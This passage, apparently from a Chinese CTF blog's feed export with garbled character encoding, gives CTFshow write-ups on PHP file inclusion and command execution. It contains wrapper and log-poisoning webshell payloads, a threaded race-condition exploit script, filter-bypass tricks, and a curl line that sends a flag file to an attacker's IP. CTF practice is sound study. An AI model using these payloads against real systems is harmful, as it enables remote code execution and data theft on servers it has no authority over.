æ‰§è¡Œã€‚</p><ul><li>zip://ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚</li><li>è¦ç”¨#åˆ†éš”å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç %23</li><li>åªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚</li><li>ç›¸åŒçš„ç±»å‹çš„è¿˜æœ‰zlib://å’Œbzip2://</li></ul><h6 id="4ã€data-ï¼š"><a href="#4ã€data-ï¼š" class="headerlink" title="4ã€data://ï¼š"></a>4ã€data://ï¼š</h6><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;[&lt;MIME-type&gt;][;cherset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;ä¸‹é¢ä¸ºç¤ºä¾‹?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>data:// åŒæ ·ç±»ä¼¼ä¸php://inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><h6 id="5ã€phar-ï¼š"><a href="#5ã€phar-ï¼š" class="headerlink" title="5ã€phar//ï¼š"></a>5ã€phar//ï¼š</h6><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;phar:&#x2F;&#x2F;å‹ç¼©åŒ…è·¯å¾„ï¼ˆç›¸å¯¹ç»å¯¹éƒ½å¯ï¼‰&#x2F;å‹ç¼©åŒ…å†…æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>éœ€è¦phar://æœ‰ç‚¹ç±»ä¼¼zip://åŒæ ·å¯ä»¥å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚<del>æœªæ¥çš„æˆ‘è¡¥ä¸€å¥ï¼Œè¿™ç©æ„è¿˜æ˜¯ä¹–ä¹–ç”¨æ¥ååºåˆ—åŒ–æ¯”è¾ƒå¥½</del></p><h4 id="å¯ä¾›åŒ…å«çš„å†…å®¹ï¼š"><a href="#å¯ä¾›åŒ…å«çš„å†…å®¹ï¼š" class="headerlink" title="å¯ä¾›åŒ…å«çš„å†…å®¹ï¼š"></a>å¯ä¾›åŒ…å«çš„å†…å®¹ï¼š</h4><h6 id="1ã€åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶ï¼š"><a href="#1ã€åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶ï¼š" class="headerlink" title="1ã€åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶ï¼š"></a>1ã€åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶ï¼š</h6><h6 id="æ¡ä»¶ï¼šå¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»å¹¶ä¸”çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½•"><a href="#æ¡ä»¶ï¼šå¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»å¹¶ä¸”çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½•" class="headerlink" title="æ¡ä»¶ï¼šå¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»å¹¶ä¸”çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½•"></a><strong>æ¡ä»¶ï¼šå¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»å¹¶ä¸”çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½•</strong></h6><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong>ä¸€èˆ¬æƒ…å†µä¸‹æ—¥å¿—å­˜å‚¨ç›®å½•è¢«ä¿®æ”¹ï¼Œéœ€è¦è¯»å–æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼ˆhttpdï¼Œconfï¼Œnginxï¼Œconfâ€¦ï¼‰æˆ–è€…æ ¹æ®phpinfo()ä¸­çš„ä¿¡æ¯æ¥å¾—çŸ¥ã€‚è¿˜æœ‰å°±æ˜¯æ—¥å¿—è®°å½•çš„ä¿¡æ¯éƒ½å¯ä»¥è¢«è°ƒæ•´ï¼Œæ¯”å¦‚è®°å½•æŠ¥é”™çš„ç­‰çº§æˆ–è€…å†…å®¹æ ¼å¼ã€‚</p><p>Apacheè¿è¡Œåä¸€èˆ¬é»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼ŒWindosä¸‹æ˜¯access.logï¼ˆè®¿é—®æ—¥å¿—ï¼‰å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼ŒLinuxä¸‹æ˜¯access_logå’Œerror_logï¼Œè®¿é—®æ—¥å¿—æ–‡ä»¶è®°å½•äº†å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚å’ŒæœåŠ¡å™¨å“åº”çš„ç›¸å…³ä¿¡æ¯ã€‚</p><p>å¦‚æœè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼Œå¦‚<a href="http://www.xxxx.com/">http://www.xxxx.com/</a><?php phpinfo(); ?>,åˆ™ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œä½†æ˜¯ä»£ç ä¸­çš„æ•æ„Ÿå­—ç¬¦ä¼šè¢«æµè§ˆå™¨è½¬ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpsuitç»•è¿‡ç¼–ç ï¼Œå°±å¯ä»¥æŠŠ<?php phpinfo(); ?> å†™å…¥apacheçš„æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åå¯ä»¥é€šè¿‡åŒ…å«æ—¥å¿—æ–‡ä»¶æ¥æ‰§è¡Œæ­¤ä»£ç ï¼Œä½†å‰ææ˜¯ä½ å¾—çŸ¥é“apacheæ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œæ‰€ä»¥ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå®‰è£…apacheæ—¶å°½é‡ä¸è¦ä½¿ç”¨é»˜è®¤è·¯å¾„ã€‚</p><p>å¯ä»¥æ”¾åœ¨User-Agentä¸­</p><h6 id="2ã€åŒ…å«SESSION"><a href="#2ã€åŒ…å«SESSION" class="headerlink" title="2ã€åŒ…å«SESSION"></a>2ã€åŒ…å«SESSION</h6><p><strong>æ¡ä»¶ï¼š</strong>æ‰¾åˆ°Sessionå†…çš„å¯æ§å˜é‡ï¼Œå¹¶ä¸”Sessionæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„ï¼ŒPHPä¸­SESSIONæ–‡ä»¶ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoä¸­çœ‹åˆ°</p><p><strong>å¸¸è§è·¯å¾„ï¼š</strong></p><p>/var/lib/php/sess_PHPSESSID<br>/tmp/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSID<br>sessionæ–‡ä»¶æ ¼å¼ï¼š sess_[phpsessid] ï¼Œè€Œ phpsessid åœ¨å‘é€çš„è¯·æ±‚çš„ cookie å­—æ®µä¸­å¯ä»¥çœ‹åˆ°ã€‚</p><h6 id="3ã€åŒ…å«-pros-self-environ"><a href="#3ã€åŒ…å«-pros-self-environ" class="headerlink" title="3ã€åŒ…å«/pros/self/environ"></a>3ã€åŒ…å«/pros/self/environ</h6><p><strong>å†…å®¹ï¼š</strong>proc/self/environä¸­ä¼šä¿å­˜user-agentå¤´ï¼Œå¦‚æœåœ¨user-agentä¸­æ’å…¥phpä»£ç ï¼Œåˆ™phpä»£ç ä¼šè¢«å†™å…¥åˆ°environä¸­ï¼Œä¹‹åå†åŒ…å«å®ƒï¼Œå³å¯ã€‚</p><p><strong>æ¡ä»¶ï¼š</strong>phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚</p><h6 id="4ã€åŒ…å«ä¸´æ—¶æ–‡ä»¶"><a href="#4ã€åŒ…å«ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="4ã€åŒ…å«ä¸´æ—¶æ–‡ä»¶"></a>4ã€åŒ…å«ä¸´æ—¶æ–‡ä»¶</h6><p>phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨C:\Winsdows\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚</p><p>ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚</p><p>å¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚</p><h5 id="78"><a href="#78" class="headerlink" title="78"></a>78</h5><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ— è¿‡æ»¤ç›´æ¥ä¼ªåè®®è¯»å–flag</p><h5 id="79"><a href="#79" class="headerlink" title="79"></a>79</h5><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;eval($_POST[&#39;cmd&#39;]);?&gt;POSTcmd&#x3D;system(&#39;cat flag.php&#39;);payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº†phpï¼Œå¯ä½¿ç”¨dataåè®®ï¼Œé€šè¿‡å†ä¼ å…¥ä¸€ä¸ªå‚æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿå¯base64è§£ç å‡ºæƒ³æ‰§è¡Œçš„å‘½ä»¤</p><h5 id="80"><a href="#80" class="headerlink" title="80"></a>80</h5><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logHEADERUser-Agent&#x3D;&lt;?php eval($_POST[[&#39;cmd&#39;]]);?&gt;POSTcmd&#x3D;system(&#39;cat fl0g.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº†dataï¼Œå¯é€šè¿‡åŒ…å«æ—¥å¿—æ¥æ‰§è¡Œå‘½ä»¤</p><h5 id="81"><a href="#81" class="headerlink" title="81"></a>81</h5><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logHEADERUser-Agent&#x3D;&lt;?php eval($_POST[[&#39;cmd&#39;]]);?&gt;POSTcmd&#x3D;system(&#39;cat fl0g.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº†å†’å·ï¼Œæ—¥å¿—åŒ…å«ä¾ç„¶å¯è¡Œ</p><h5 id="82"><a href="#82" class="headerlink" title="82"></a>82</h5><p>è¿‡æ»¤äº†.ï¼Œåªèƒ½åŒ…å«æ— åç¼€æ–‡ä»¶ï¼Œåœ¨PHPä¸­å”¯ä¸€èƒ½æ§åˆ¶çš„æ— åç¼€æ–‡ä»¶å°±æ˜¯sessionæ–‡ä»¶ï¼Œæ‰€ä»¥å°è¯•é€šè¿‡è„šæœ¬ç«äº‰åŒ…å«å†™å…¥</p><pre class="line-numbers language-none"><code class="language-none">åŸç†ï¼šåœ¨æˆ‘ä»¬è‡ªè¡Œæ·»åŠ PHPSSEIDåˆ°ç½‘é¡µä¸­æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶åœ¨&#x2F;tmp&#x2F;sess_nameï¼Œæ–‡ä»¶åå¯æ§ã€‚æ–‡ä»¶å†…å®¹é€šè¿‡PHP_ SESSION_UPLOAD_PROGRESSå‚æ•°æ§åˆ¶ï¼Œè¯¥å‚æ•°ç”¨äºå®æ—¶è·å–æ–‡ä»¶ä¸Šä¼ è¿›åº¦ï¼Œä¼šè¿”å›ä¸€ä¸ªSESSIONï¼Œå¹¶ä¸”è¯¥å‚æ•°çš„å†…å®¹å°†ä¼šè¢«åŠ å…¥åˆ°sess_nameæ–‡ä»¶ä¸­æ–¹æ³•ï¼šä¸€è¾¹æ„é€ POSTæ–‡ä»¶ä¼ è¾“è¯·æ±‚ï¼Œå°†PHP_SESSION_UPLOAD_PROGRESSåŒ…å«åˆ°è¯·æ±‚å¤´ä¸­ï¼Œä¸€è¾¹åŒ…å«&#x2F;tmp&#x2F;sess_nameæ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="83-86"><a href="#83-86" class="headerlink" title="83-86"></a>83-86</h5><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># ç«äº‰ä¸‡èƒ½è„šæœ¬ï¼š# os.system(&#39;rm -rf &#x2F;bin&#x2F;Azuki&#39;)# æ¶ˆç­Azukiä¿å¹³å®‰import ioimport requestsimport threadingsessID &#x3D; &#39;flag&#39;url &#x3D; &#39;http:&#x2F;&#x2F;193cefd4-47a6-444e-801b-39906604df13.challenge.ctf.show&#x2F;&#39;def write(session):    while event.isSet():        f &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)        response &#x3D; session.post(            url,            cookies&#x3D;&#123;&#39;PHPSESSID&#39;: sessID&#125;,            data&#x3D;&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#39;&#125;,            files&#x3D;&#123;&#39;file&#39;: (&#39;test.txt&#39;, f)&#125;        )def read(session):    while event.isSet():        response &#x3D; session.get(url + &#39;?file&#x3D;&#x2F;tmp&#x2F;sess_&#123;&#125;&#39;.format(sessID))        if &#39;test&#39; in response.text:            print(response.text)            event.clear()        else:            print(&#39;[*]retrying...&#39;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    event &#x3D; threading.Event()    event.set()    with requests.session() as session:        for i in range(1, 30):            threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()        for i in range(1, 30):            threading.Thread(target&#x3D;read, args&#x3D;(session,)).start()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>87</strong></p><p>å…ˆè´´ä¸€ä¸ª<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">æ–‡ç« </a></p><p>å¯¹äºphp://filterçš„ä½¿ç”¨</p><p>ç®€å•ç‰ˆæœ¬ï¼šä½¿ç”¨rot13ç¼–è§£ç ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;1.phpï¼ˆè®°å¾—è¿›è¡Œä¸¤æ¬¡URLç¼–ç ï¼‰POST:pbagrag&#x3D;&lt;?cuc flfgrz(&#39;gnp s*.cuc&#39;);?&gt;&lt;?php system(&#39;tac f*.php&#39;);?&gt;ç»è¿‡rot13ç¼–ç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¤æ‚ç‰ˆæœ¬ï¼šä½¿ç”¨base64ç¼–è§£ç ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;1.phpï¼ˆè®°å¾—è¿›è¡Œä¸¤æ¬¡URLç¼–ç ï¼‰POST:pbagrag&#x3D;&lt;?cuc flfgrz(&#39;gnp s*.cuc&#39;);?&gt;&lt;?php system(&#39;tac f*.php&#39;);?&gt;ç»è¿‡rot13ç¼–ç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åŸç†ï¼šåœ¨è¿‡æ»¤å™¨è¿›è¡Œbase64ç¼–è§£ç æ—¶ï¼Œä¼šç»•è¿‡æ‰€æœ‰ä¸å±äºbase64ç¼–ç åçš„å­—ç¬¦ï¼ˆ+, / , 0<del>9,a</del>z,A~Zï¼‰ï¼Œæ¯”å¦‚é¢˜ä¸­çš„<code>&lt;?php die(&quot;å¤§ä½¬åˆ«ç§€äº†&quot;);?&gt;</code>ï¼Œè¿‡æ»¤å™¨è¯†åˆ«åˆ°çš„å­—ç¬¦åªæœ‰phpdieï¼Œå…¶ä½™çš„å­—ç¬¦è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æˆ‘ä»¬å·²ç»ç¼–å¥½çš„base64æ–‡æœ¬åŠ ä¸¤ä¸ªå­—æ¯å³å¯è®©phpdiexxè¢«è§£æä¸ºbase64ç¼–ç åè¯­å¥ï¼Œä¸åé¢ä»£ç æ— å…³äº†</p><p><strong>88</strong></p><p>æ„é€ è¯­å¥ä½¿å¾—base64ç¼–ç ååªå«æ•°å­—å’Œå­—æ¯å³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgICBldmFsKCRfUE9TVFsxXSk7&#x2F;&#x2F;&lt;?php   eval($_POST[1]);POST:1&#x3D;system(&#39;tac f*&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowå‘½ä»¤æ‰§è¡Œ</title>
      <link href="/posts/47520.html"/>
      <url>/posts/47520.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h1><p>å±é™©å‡½æ•°ï¼š</p><pre class="line-numbers language-none"><code class="language-none">------------------------------------------------æ‰§è¡Œ(ç³»ç»Ÿ)å‡½æ•° eval exec - æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº shell_exec system passthru proc_open pcntl_exec â€” åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åº pcntl_fork  åœ¨å½“å‰è¿›ç¨‹å½“å‰ä½ç½®äº§ç”Ÿåˆ†æ”¯ï¼ˆå­è¿›ç¨‹ï¼‰ã€‚ dl â€” è¿è¡Œæ—¶è½½å…¥ä¸€ä¸ª PHP æ‰©å±• unserialize - ååºåˆ—åŒ–ä¸€ä¸ªç±»å‡½æ•°nashell ------------------------------------------------æ˜¾ç¤ºæºç     phpinfo readfile readline show_source heighlight heighlight_string curl php   curl -f filename&#x3D;@&#x2F;flag [è¦ä¼ åˆ°çš„ipåœ°å€å’Œç«¯å£] è§£é‡Šï¼šåœ¨linuxé‡Œé¢å•å¼•å·é‡Œé¢çš„çš„å‘½ä»¤ä¼šç›´æ¥å…ˆæ‰§è¡Œ ä»¥ä¸Šçš„curl -få‘½ä»¤ä¼šæŠŠ@åé¢æ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶ä¼ è¾“åˆ°æŒ‡å®šçš„ipç«¯å£åœ°å€ æ‰€ä»¥ä¼šç›´æ¥æ‰§è¡Œcurlå‘½ä»¤å°†å¾—åˆ°çš„flagæ–‡ä»¶ä¼ è¾“åˆ°æŒ‡å®šidç«¯å£ï¼Œä¸éœ€è¦ç®¡ping  å‘½ä»¤äº†åªè¦ç›‘å¬æ­¤ç«¯å£æ‹¿åˆ°æ–‡ä»¶å³å¯ file  ------------------------------------------------å›è°ƒå‡½æ•° array_walk array_walk_recursive array_map call_user_func_array call_user_func ------------------------------------------------æ•°ç»„ä½¿ç”¨å›è°ƒå‡½æ•°è¿‡æ»¤ array_filter filter_var filter_var_array ------------------------------------------------å†™å…¥æ–‡ä»¶ fopen fwrite file_put_contents - å°†æ•°æ®å†™å…¥æ–‡ä»¶ä¸­ file-get-contents - è·å–å‚æ•°çš„æ–‡ä»¶èµ„æº move_uploaded_file - å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½® ------------------------------------------------å‘½ä»¤å­—ç¬¦ä¸²è½¬ä¹‰ escapeshellcmd - å¯¹ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ escapeshellarg â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•° ------------------------------------------------å…¶ä»– proc_terminate â€” æ€é™¤ç”± proc_open æ‰“å¼€çš„è¿›ç¨‹ touch - è®¾å®šæ–‡ä»¶çš„è®¿é—®å’Œä¿®æ”¹æ—¶é—´<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ç”¨äºæ‰§è¡Œphpå‡½æ•°çš„å‡½æ•°ï¼š</p><pre class="line-numbers language-none"><code class="language-none">eval()ã€assert()ã€preg_replace(&quot;&#x2F;test&#x2F;e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;)&#x2F;&#x2F;æ­£åˆ™è§„åˆ™ä¸­å«æœ‰&#x2F;eä¿®é¥°ç¬¦å°±å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´create_function()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//æ‰§è¡Œåç›´æ¥æ˜¾ç¤ºç»“æœ</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//æ‰§è¡Œåç›´æ¥æ˜¾ç¤ºç»“æœ,è¿”å›å€¼ï¼šæˆåŠŸåˆ™è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œ å¤±è´¥åˆ™è¿”å› false</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo</span><span class="token string backtick-quoted-string">`å‘½ä»¤`</span><span class="token comment">//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><span id="more"></span><p>å¯ç”¨äºæ›¿ä»£ç©ºæ ¼çš„å­—ç¬¦ï¼š</p><pre class="line-numbers language-none"><code class="language-none">%09ã€$IFS$9ã€ $&#123;IFS&#125;ã€$IFS%09ã€&lt; ã€&lt;&gt;ã€%20ç­‰<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ç”¨äºè¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼š</p><pre class="line-numbers language-none"><code class="language-none">cattacheadmorelesscutnlls &#x2F; | tee 1.txtå°†lsåçš„ç»“æœå†™å…¥1.txtä¸­<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šé…ç¬¦ï¼š</p><pre class="line-numbers language-none"><code class="language-none">*ä»£è¡¨ä»»æ„ä½?ä»£è¡¨ä¸€ä½<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>å–åç»•è¿‡</strong></p><p>åŸç†ï¼šphpå­—ç¬¦ä¸²å–åä¹‹åå¯ç»•è¿‡æ­£åˆ™</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//%8F%97%8F%96%91%99%90</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ—¶ä¼ å…¥<code>a=(~%8F%97%8F%96%91%99%90)();</code></p><p>å³å¯æ‰§è¡Œphpinfoå‡½æ•°</p><p>å¯¹äºPHPï¼Œå½¢å¦‚ <code>(func_name)()</code>ï¼Œå…¶ä¸­func_nameå¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œä¼šæ‰§è¡Œè¿™ä¸ªfunc</p><p>ä½†æ˜¯å¦‚æœåªä¼ å…¥<code>(~%8F%97%8F%96%91%99%90%D7%D6)</code>å†…å®¹ä¸º<code>phpinfo()</code>ï¼Œä¼šå‘ç°æ­¤æ—¶å‡½æ•°ä¸ä¼šè¢«æ‰§è¡Œï¼Œæ­¤æ—¶phpå–åå–å¾—äº†phpinfoï¼Œä½†æ˜¯å–åå¾—åˆ°çš„å­—ç¬¦ä¸² <code>phpinfo()</code>å¹¶ä¸ä¼šè¢«å½“ä½œä»£ç æ‰§è¡Œï¼Œå› ä¸ºåœ¨å–åä¹‹å‰PHPè§£é‡Šå™¨å¹¶ä¸çŸ¥é“è¿™åŸæ¥æ˜¯ <code>phpinfo()</code></p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³æ‰§è¡Œshellï¼Œæ˜¯ä¸èƒ½å•ä¼ å…¥ä¸€ä¸ª<code>$_POST[&#39;kkk&#39;]</code>çš„å–åæ¥æ‰§è¡Œçš„ï¼Œè€Œæ˜¯éœ€è¦ä½¿ç”¨åµŒå¥—æ‰§è¡Œçš„æ–¹å¼ï¼Œå½¢å¦‚<code>assert($_POST[kkk])</code>ä¼ å…¥<code>(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%94%94%94%A2)</code>å†ä¼ å…¥å‘½ä»¤kkkæ¥æ‰§è¡Œ</p><h5 id="29"><a href="#29" class="headerlink" title="29"></a>29</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;echo(&#96;cat%20f*&#96;);<span 